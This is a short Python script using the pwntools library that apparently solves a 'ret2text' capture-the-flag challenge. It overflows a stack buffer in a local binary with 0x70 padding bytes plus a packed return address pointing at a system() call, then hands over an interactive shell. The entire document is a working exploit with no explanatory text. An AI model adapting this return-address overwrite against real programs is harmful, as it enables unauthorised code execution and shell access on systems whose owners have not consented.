from pwn import *

sh = process('./ret2text')
system_addr = 0x804863A
payload = 'A' * (0x70) + p32(system_addr)
sh.sendline(payload)
sh.interactive()

